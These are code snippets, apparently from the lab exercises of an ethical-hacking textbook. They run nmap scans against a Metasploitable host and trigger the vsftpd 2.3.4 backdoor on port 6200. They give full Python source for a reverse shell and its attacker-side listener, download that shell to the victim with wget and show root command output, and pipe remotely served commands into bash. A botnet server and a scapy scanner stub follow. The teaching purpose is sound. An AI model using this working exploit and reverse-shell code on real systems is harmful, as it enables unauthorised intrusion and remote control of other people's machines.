["```\nkali@kali:~$ nmap -sV 192.168.1.101\nStarting Nmap ( https://nmap.org )\nNmap scan report for 192.168.1.101\nHost is up (0.00064s latency).\nNot shown: 977 closed ports\nPORT     STATE SERVICE     VERSION\n\n21/tcp   open  ftp         vsftpd 2.3.4\n\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n23/tcp   open  telnet      Linux telnetd\n\n25/tcp   open  smtp        Postfix smtpd\n\n53/tcp   open  domain      ISC BIND 9.4.2\n\n80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)\n\n... More Ports...\n```", "```\nkali@kali:~$ nmap -sS <Metasploitable IP address>\n```", "```\nkali@kali:~$ nmap -sF <Metasploitable IP address>\n```", "```\nkali@kali:~$ nmap -sX <Metasploitable IP address>\n```", "```\nkali@kali:~$ nc <Metasploitable IP address> 21\nuser Hacker:)\npass invalid\n```", "```\nkali@kali:~$ nc <Metasploitable IP address> 6200\n```", "```\nkali@kali:~$ mousepad &\n```", "```\n   import sys\n\n   from subprocess import Popen, PIPE\n\n   from socket import *\n➊ serverName = sys.argv[1]\n\n   serverPort = 8000\n\n   #Create IPv4(AF_INET), TCPSocket(Sock_Stream)\n➋ clientSocket = socket(AF_INET, SOCK_STREAM)\n➌ clientSocket.connect((serverName, serverPort))\n\n   clientSocket.send('Bot reporting for duty'.encode()) ➍ \n\n   command = clientSocket.recv(4064).decode() ➎ \n\n   while command != \"exit\":\n\n     ➏ proc = Popen(command.split(\" \"), stdout=PIPE, stderr=PIPE)\n\n     ➐ result, err = proc.communicate()\n\n        clientSocket.send(result)\n\n        command = (clientSocket.recv(4064)).decode()\n\n   clientSocket.close()\n```", "```\n   from socket import *\n\n   serverPort = 8000\n➊ serverSocket = socket(AF_INET, SOCK_STREAM)\n➋ serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)\n➌ serverSocket.bind(('', serverPort))\n➍ serverSocket.listen(1)\n\n   print(\"Attacker box listening and awaiting instructions\")\n➎ connectionSocket, addr = serverSocket.accept()\n\n   print(\"Thanks for connecting to me \"\n\n             +str(addr))\n\n   message = connectionSocket.recv(1024)\n\n   print(message)\n\n   command =\"\"\n\n   while command != \"exit\":\n\n       command = input(\"Please enter a command: \")\n\n       connectionSocket.send(command.encode())\n\n       message = connectionSocket.recv(1024).decode()\n\n       print(message)\n\n➏ connectionSocket.shutdown(SHUT_RDWR)\n\n   connectionSocket.close()\n```", "```\nkali@kali:~$ python3 ~/Desktop/shell/shellServer.py\n```", "```\nkali@kali:~$ cd ~/Desktop/shell\n```", "```\nkali@kali:~/Desktop/shell$ python3 -m http.server 8080\n```", "```\nkali@kali:~$ nc 192.168.1.101 6200\nmkdir shell\ncd shell\nwget <Kali IP>:8080/reverseShell.py\n\n--13:38:01--  http://192.168.1.103:8080/reverseShell.py\n\n            => `reverseShell.py'\nConnecting to 192.168.1.103:8080... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 864 [text/plain]\n\n     0K                                                       100%  161.63 MB/s\n\n13:38:01 (161.63 MB/s) - `reverseShell.py' saved [864/864]\n```", "```\npython reverseShell.py <Kali IP address> &\n```", "```\nkali@kali:python3 ~/Desktop/shell/shellServer.py\nAttacker box listening and awaiting instructions\nThanks for connecting to me ('192.168.1.101', 50602)\nBot reporting for duty\nPlease enter a command: whoami\nroot\n\nPlease enter a command: pwd\n\n/shell\n\nPlease enter a command: ls\nreverseShell.py\n\nPlease enter a command:\n```", "```\nkali@kali:~$ touch commands.sh\nkali@kali:~$ echo \"ping 172.217.9.206\" > commands.sh\n```", "```\nkali@kali:~$ python3 -m http.server 8080\n```", "```\nmsfadmin@metasploitable:~$ wget -0- <IP address of server bot> :8080\\commands.sh | bash\n\n```", "```\n   import socketserver\n\n➊ class BotHandler(socketserver.BaseRequestHandler):\n\n     ➋ def handle(self):\n\n         ➌ self.data = self.request.recv(1024).strip()\n\n            print(\"Bot with IP {}  sent:\".format(self.client_address[0]))\n\n            print(self.data)\n\n         ➍ self.request.sendall(self.data.upper())\n\n   if __name__ == \"__main__\":\n\n        HOST, PORT = \"\", 8000\n\n     ➎ tcpServer =  socketserver.TCPServer((HOST, PORT), BotHandler)\n\n        try:\n\n         ➏ tcpServer.serve_forever()\n\n        except:\n\n            print(\"There was an error\")\n```", "```\nsyn_packet = IP(dst=\"192.168.1.101\") / TCP( dport=443, flags='S')\n```", "```\n   from scapy.all import IP, ICMP,TCP, sr1\n\n   import sys\n\n➊ def icmp_probe(ip):\n\n       icmp_packet = IP(dst=ip)/ICMP()\n\n       resp_packet = sr1(icmp_packet, timeout=10)\n\n       return resp_packet != None\n\n➋ def syn_scan(ip, port):\n\n       pass\n\n   if __name__ == \"__main__\":\n\n       ip = sys.argv[1]\n\n       port = sys.argv[2]\n\n       if icmp_probe(ip):\n\n           syn_ack_packet = syn_scan(ip, port)\n\n           syn_ack_packet.show()\n\n       else:\n\n           print(\"ICMP Probe Failed\")\n```"]